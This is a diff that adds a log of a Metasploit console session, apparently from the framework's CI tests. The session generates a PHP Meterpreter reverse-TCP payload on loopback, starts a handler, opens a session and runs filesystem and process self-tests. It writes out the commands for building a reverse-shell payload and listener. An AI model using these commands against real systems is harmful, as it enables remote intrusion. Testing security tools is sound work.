@@ -1,0 +1,87 @@
+use php/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3978-imym0btxt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20231026-3978-bwzvru.php -f raw AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_debug_log20231026-3978-t5kimntxt MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3978-imym0btxt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34952 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20231026-3978-bwzvru.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 2
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6003 
+[*] Meterpreter session 3 opened (127.0.0.1:6003 -> 127.0.0.1:49741) at 2023-10-26 19:02:06 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=3 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-pakosvmc
+[*] meterpreter-test-dir-pakosvmc created
+[*] Setup: Now in /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc
+[*] Running against session 3
+[*] Session type is meterpreter and platform is osx
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"Mac-1698328022627.local", "OS"=>"Darwin Mac-1698328022627.local 20.6.0 Darwin Kernel Version 20.6.0: Thu Jul  6 22:12:47 PDT 2023; root:xnu-7195.141.49.702.12~1/RELEASE_X86_64 x86_64", "Architecture"=>nil, "BuildTuple"=>nil, "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fef97379a40>:0x00007fef97619638 @stathash={"st_dev"=>16777220, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>501, "st_gid"=>20, "st_rdev"=>0, "st_ino"=>12895012660, "st_size"=>64, "st_atime"=>1698346926, "st_mtime"=>1698346926, "st_ctime"=>1698346926}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-eiroqfgt
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-eiroqfgt
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc
+[*] [should change directories] New CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc/meterpreter-test-dir-eiroqfgt
+[*] [should change directories] Back to old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-pakosvmc
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-eiroqfgt
+[*] [should create and remove files] Wrote to meterpreter-test-eiroqfgt, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-eiroqfgt.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-eiroqfgt
+[*] [should move files] Destination File Name: meterpreter-test-eiroqfgt-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-eiroqfgt
+[*] [should copy files] Destination File Name: meterpreter-test-eiroqfgt-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-eiroqfgt.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 4157
+[+] should return its own process id
+[*] [should return a list of processes] PID info: nil
+[-] FAILED: should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] SKIPPED: def test_net_config (This meterpreter does not implement get_interfaces, skipping tests)
+[*] Testing complete in 0.6 seconds
+[-] Passed: 17; Failed: 1; Skipped: 1
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 3 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
